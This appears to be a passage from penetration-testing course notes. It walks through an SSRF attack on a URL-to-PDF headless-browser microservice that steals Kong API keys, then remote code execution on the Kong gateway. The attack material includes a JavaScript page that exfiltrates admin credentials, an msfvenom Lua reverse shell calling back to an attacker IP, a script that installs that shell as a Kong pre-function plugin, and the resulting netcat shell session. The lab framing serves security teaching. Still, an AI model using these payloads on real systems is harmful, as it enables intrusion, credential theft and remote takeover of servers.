kali@kali:~$ sudo tail /var/log/apache2/access.log
...
192.168.120.135 - - [25/Feb/2021:13:34:24 -0500] "GET /exfil.html HTTP/1.1" 200 569 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
192.168.120.135 - - [25/Feb/2021:13:34:24 -0500] "GET /callback?%7B%22next%22%3Anull%2C%22data%22%3A%5B%7B%22created_at%22%3A1613767827%2C%22id%22%3A%22c34c38b6-4589-4a1e-a8f7-d2277f9fe405%22%2C%22tags%22%3Anull%2C%22ttl%22%3Anull%2C%22key%22%3A%22SBzrCb94o9JOWALBvDAZLnHo3s90smjC%22%2C%22consumer%22%3A%7B%22id%22%3A%22a8c78b54-1d08-43f8-acd2-fb2c7be9e893%22%7D%7D%5D%7D HTTP/1.1" 404 491 "http://192.168.118.3/exfil.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
```

After decoding the data, we found the API key.
```
{"next":null,"data":[{"created_at":1613767827,"id":"c34c38b6-4589-4a1e-a8f7-d2277f9fe405","tags":null,"ttl":null,"key":"SBzrCb94o9JOWALBvDAZLnHo3s90smjC","consumer":{"id":"a8c78b54-1d08-43f8-acd2-fb2c7be9e893"}}]} 
```

#### practise

1. Follow the steps above again to get your API key.
2. The attack to steal credentials from Kong can be reproduced by calling the rendering service directly using the API key without calling the file import service.
```
curl -i \
  -H "apikey: SBzrCb94o9JOWALBvDAZLnHo3s90smjC" \
  "http://apigateway:8000/render?url=http://192.168.45.245/key_evil.html"
```

3. Adjust your HTML payload so that the credentials are included in the PDF returned by the service.

```
curl -sS \
  -H "apikey: SBzrCb94o9JOWALBvDAZLnHo3s90smjC" \
  "http://apigateway:8000/render?url=http://192.168.45.245/key_evil1.html" \
  -o key_evil.pdf
```

```
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Kong Admin API response</title>

  <style>
    body {
      font-family: monospace;
      font-size: 11px;
    }

    pre {
      white-space: pre-wrap;
      overflow-wrap: anywhere;
    }
  </style>

  <script>
    async function renderCredentials() {
      const output = document.getElementById("output");

      try {
        const response = await fetch("http://172.16.16.2:8001/key-auths");
        const data = await response.text();

        output.textContent = data;
      } catch (error) {
        output.textContent = "Request failed: " + String(error);
      }
    }
  </script>
</head>

<body onload="renderCredentials()">
  <h1>Kong Admin API response</h1>
  <pre id="output">Loading…</pre>
</body>
</html>
```

#### extra effort

Create a web server using the programming language of your choice to handle JavaScript callbacks and automatically URL decode data.


## 9.6.3 PDF file link for microservice source code analysis

Rendering Service is an open source URL to PDF microservice. ](https://github.com/alvarcarto/url-to-pdf-api) The documentation for this application contains warnings about the risks of running this application publicly. This application has been integrated into the lab environment and requires authentication at the API gateway to simulate some common microservice environments.

We have exploited a headless browser vulnerability used by this application. We'll take a quick look at the application's source code to gain familiarity with NodeJS and identify its security controls.

In fact, the application includes some validation on the initial request. Let’s take a look at the application routing configuration located in `/src/router.js`. The relevant code has been uploaded to [GitHub. ](https://github.com/alvarcarto/url-to-pdf-api/blob/master/src/router.js) We’ll start at the beginning of the file and see what dependencies it imports.
```
01  const _ = require('lodash');
02  const validate = require('express-validation');
03  const express = require('express');
04  const render = require('./http/render-http');
05  const config = require('./config');
06  const logger = require('./util/logger')(__filename);
07  const { renderQuerySchema, renderBodySchema, sharedQuerySchema } = require('./util/validation');
```

The application imports the Express framework (line 2) and the express-validator middleware for validation (line 3). It also imports three custom validation objects on line 7. These objects will become important later.

Next, we'll look at the code that defines the route for GET requests to `/api/render`. The relevant code starts on line 29.
```
29  const getRenderSchema = {
30    query: renderQuerySchema,
31    options: {
32      allowUnknownBody: false,
33      allowUnknownQuery: false,
34    },
35  };
36  router.get('/api/render', validate(getRenderSchema), render.getRender);
```

Line 36 defines the route for GET requests to `/api/render`. The first parameter of the `router.get()` function is the URI path. The middle parameter is a validation function that receives a `getRenderSchema` object. The application calls this validation function before calling the handler function (set by the last parameter, `render.getRender`).
Review the definition of the renderQuerySchema object, located in /src/util/validation.js ([Source](https://github.com/alvarcarto/url-to-pdf-api/blob/master/src/util/validation.js)).
```
68  const renderQuerySchema = Joi.object({
69    url: urlSchema.required(),
70  }).concat(sharedQuerySchema);
```

The definition of `renderQuerySchema` is a [_Joi_](https://joi.dev/) object. Joi is a schema definition and data validation library for NodeJS.
The code defines a `url` parameter on line 69 with the value `urlSchema.required()`. After the Joi object is created, the code connects it with the `sharedQuerySchema` object. The `sharedQuerySchema` object contains additional schema definitions, but are not important for our analysis. However, the `urlSchema` object is crucial. We can find its definition starting at line 3.

```
03  const urlSchema = Joi.string().uri({
04    scheme: [
05      'http',
06      'https',
07    ],
08  });
```

On line 3, urlSchema is set to [Joi.string().uri](https://joi.dev/api/18.x.x#string.uri). This requires that the string value must be a valid URL. The scheme parameter further restricts the URL to only use HTTP or HTTPS protocols. These settings should prevent applications from processing URLs that use the FILE protocol.

We can verify this control by calling the service directly through API Gateway and submitting the `file:///etc/passwd` value in the url parameter.

```
┌──(kali㉿kali)-[~/Desktop/SSRF]
└─$ curl "http://apigateway:8000/render?url=file:///etc/passwd&apikey=SBzrCb94o9JOWALBvDAZLnHo3s90smjC"

{"status":400,"statusText":"Bad Request","errors":[{"field":["url"],"location":"query","messages":["\"url\" must be a valid uri with a schemematching the http|https pattern"],"types":["string.uriCustomScheme"]}]}                            
```

Instead of receiving the file contents, we receive an error saying that our URL parameters are invalid. Additionally, Chrome itself blocks a resource loaded over HTTP or HTTPS from accessing another resource using the FILE protocol.

Now that we understand the validation mechanism, let's move on to analyzing how the application renders the URL we submit. According to Listing 52, `render.getRender` is the request handling function.

This function is defined in `/src/http/render-http.js` ([source code](https://github.com/alvarcarto/url-to-pdf-api/blob/master/src/http/render-http.js)).
```js
01  const { URL } = require('url');
02  const _ = require('lodash');
03  const normalizeUrl = require('normalize-url');
04  const ex = require('../util/express');
05  const renderCore = require('../core/render-core');
06  const logger = require('../util/logger')(__filename);
07  const config = require('../config');
...
24  const getRender = ex.createRoute((req, res) => {
25    const opts = getOptsFromQuery(req.query);
26  
27    assertOptionsAllowed(opts);
28    return renderCore.render(opts)
29      .then((data) => {
30        if (opts.attachmentName) {
31          res.attachment(opts.attachmentName);
32      }
33      res.set('content-type', getMimeType(opts));
34      res.send(data);
35    });
36  });
```

The `getRender` function performs some additional validation by calling `assertOptionsAllowed`. We will not discuss this function in detail here. Our main concern is the `renderCore.render` function called on line 28. The application returns the result of this function as an attachment in the final server response (lines 31-34).

This function is defined in `/src/core/render-core.js` ([source code](https://github.com/alvarcarto/url-to-pdf-api/blob/master/src/core/render-core.js)).

Let's start with the import part.
```js
01  const puppeteer = require('puppeteer');
02  const _ = require('lodash');
03  const config = require('../config');
04  const logger = require('../util/logger')(__filename);
```

As you can see from the import statement on line 1, the application uses [Puppeteer](https://github.com/puppeteer/puppeteer#readme), a Node library for programmatically managing Chrome or Chromium. The rendering function starts on line 41. Instead of reviewing the code in the function line by line, we'll focus on the key sections.

``` js
041  async function render(_opts = {}) {
042    const opts = _.merge({
...  
065    }, _opts);
...
075    const browser = await createBrowser(opts);
076    const page = await browser.newPage();
...
106    try {
107      logger.info('Set browser viewport..');
108      await page.setViewport(opts.viewport);
109      if (opts.emulateScreenMedia) {
110        logger.info('Emulate @media screen..');
111        await page.emulateMedia('screen');
112      }
...
123      if (_.isString(opts.html)) {
124        logger.info('Set HTML ..');
125        await page.setContent(opts.html, opts.goto);
126      } else {
127        logger.info(`Goto url ${opts.url} ..`);
128        await page.goto(opts.url, opts.goto);
129      }
...
```

The function declares a browser object on line 75. The `createBrowser` function creates a new browser process using a Puppeteer and sets the value of the object. On line 76, a new page is created. The page here can be understood as a single tab in the browser. The code then defines several response handlers, which we omit. Finally, on line 123, the function checks whether the request contains HTML. If not, the function loads the submitted URL in the browser.

There's more code in this function to handle page scrolling and other user-customized options, but we've covered the essentials. Let's review the end of the function.
```js
170      if (opts.output === 'pdf') {
171        if (opts.pdf.fullPage) {
172          const height = await getFullPageHeight(page);
173          opts.pdf.height = height;
174        }
175        data = await page.pdf(opts.pdf);
176      } else if (opts.output === 'html') {
177        data = await page.evaluate(() => document.documentElement.innerHTML);
178      } else {
...
206    return data;
207  }
```

If the requested output format is PDF, this function calls the `page.pdf` function and assigns the result to the `data` variable. Otherwise, if the requested output format is HTML, the function calls the `page.evaluate` function, which returns the `innerHtml` element of the loaded page.

As we discovered in Listing 56, the application returns the data value as an attachment in the server response.

While we have yet to find a way to access local files on the server with headless Chrome and the URL to PDF microservice, we do have the ability to execute full JavaScript code from a headless browser. This will be very useful as we move towards remote code execution.


# 9.7 Remote code execution

First, let's review potential goals.
![[Pasted image 20260727160334.png]]

Since we can execute arbitrary JavaScript code through the rendering service, we can send requests to any host on the internal network. It is difficult to attack a PostgreSQL database without credentials. The REDIS server looks attractive, but let's focus on the Kong API Gateway first since we already know it can be accessed via a headless browser rendering the service.

## 9.7.1 Remote code execution vulnerability in Kong Admin API

After carefully reading the documentation of Kong API Gateway, we found that the plug-in part is an area worthy of focus. Since we need to restart Kong to install custom plug-ins, we must use Kong's built-in plug-ins.

There is an interesting warning in the documentation of the Serverless [_Functions_](https://docs.konghq.com/hub/kong-inc/serverless-functions/) plugin:
>Warning: This serverless plug-in (including pre- and post-functions) allows arbitrary code execution by any user with the ability to enable the plug-in. If your organization has security concerns about this, disable this plugin in the kong.conf file.

This sounds right up our alley! Let's check if Kong has the plugin loaded. The first time we call the Kong API Gateway Management API, we actually include information about the plugins that are enabled on the server.
```
{"plugins":{"enabled_in_cluster":["key-auth"],"available_on_server":{"grpc-web":true,"correlation-id":true,"pre-function":true,"cors":true,...
```

Since the pre-function plugin is enabled, let's try to take advantage of it. The plugin runs Lua code, so we need to build a matching payload. We can use msfvenom to generate a reverse shell payload.
``` bash
┌──(kali㉿kali)-[~/Desktop/SSRF]
└─$ msfvenom -p cmd/unix/reverse_lua lhost=192.168.45.245 lport=8888 -f raw -o shell.lua
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 223 bytes
Saved as: shell.lua

┌──(kali㉿kali)-[~/Desktop/SSRF]
└─$ cat shell.lua         
lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('192.168.45.245',8888);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"    
```

Since we will be uploading a Lua file, "lua -e" is not required in the final version of the payload.

According to the Kong documentation, we need to add a plugin to the Service. We can add plugins to an existing Service, but to limit its exposure, we create a new Service. Service requires a route to be called. Let's create a new HTML page that contains a JavaScript function that creates a Service, adds a route to the Service, and then adds our Lua code to the Service as a "pre-function" plugin.

We can use a previous JavaScript function as a starting point for a new function.
``` js
<html>
<head>
<script>

function createService() {
    fetch("http://172.16.16.2:8001/services", {
      method: "post",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({"name":"supersecret", "url": "http://127.0.0.1/"})
    }).then(function (route) {
      createRoute();
    });
}

function createRoute() {
    fetch("http://172.16.16.2:8001/services/supersecret/routes", { 
      method: "post",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({"paths": ["/supersecret"]})
    }).then(function (plugin) {
      createPlugin();
    });  
}

function createPlugin() {
    fetch("http://172.16.16.2:8001/services/supersecret/plugins", { 
      method: "post",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({"name":"pre-function", "config" :{ "access" :[  "local s=require('socket');local t=assert(s.tcp());t:connect('192.168.45.245',8888);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();" ]}})
    }).then(function (callback) {
      fetch("http://192.168.45.245/callback?setupComplete");
    });  
}
</script>
</head>
<body onload='createService()'>
<div></div>
</body>
</html>
```

Once the page is in our website root, we can use curl to send it to the rendering service.
```
kali@kali:~$ curl -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.3:9000/api/render?url=http://192.168.45.245/rce.html"}' http://apigateway:8000/files/import

{"errors":[{"message":"You don't have permission to access this.","extensions":{"code":"FORBIDDEN"}}]}
```

If everything is fine, there should be a "setupComplete" entry in our access.log file.
```
kali@kali:~$ sudo tail /var/log/apache2/access.log
...
192.168.120.135 - - [25/Feb/2021:13:46:16 -0500] "GET /rce.html HTTP/1.1" 200 872 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
192.168.120.135 - - [25/Feb/2021:13:46:16 -0500] "GET /callback?setupComplete HTTP/1.1" 404 491 "http://192.168.118.3/rce.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
```

The payload appears to be successful. Next we need to set up a Netcat listener and then trigger our Lua payload by accessing the new service endpoint.
```
kali@kali:~$ curl -i  http://apigateway:8000/supersecret
```

The request hangs, but if we check the Netcat listener we should get a shell.
```
kali@kali:~$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [192.168.118.3] from (UNKNOWN) [192.168.120.135] 41764

whoami
kong

ls -al
total 72
drwxr-xr-x    1 root     root          4096 Feb 19 20:49 .
drwxr-xr-x    1 root     root          4096 Feb 19 20:49 ..
-rwxr-xr-x    1 root     root             0 Feb 19 20:49 .dockerenv
drwxr-xr-x    1 root     root          4096 Dec 17 14:57 bin
drwxr-xr-x    5 root     root           340 Feb 25 14:38 dev
-rwxrwxr-x    1 root     root          1236 Dec 17 14:57 docker-entrypoint.sh
drwxr-xr-x    1 root     root          4096 Feb 19 20:49 etc
drwxr-xr-x    1 root     root          4096 Dec 17 14:57 home
...
```

The payload was successful and we now have the reverse shell of the Kong API Gateway server. The presence of the .dockerenv and docker-entrypoint.sh files confirmed our previous suspicion that these servers were actually containers.

#### exercise

Complete the JavaScript payload and obtain the shell.





# 9.8 Summary

In this module, we extend black-box testing techniques to discover and enumerate API microservices. We discovered a service that was vulnerable to a server-side request forgery vulnerability and exploited it to bypass the API gateway and call the service endpoint directly. Additionally, we discovered a service running on a headless browser and using JavaScript to achieve remote code execution on the API Gateway server.






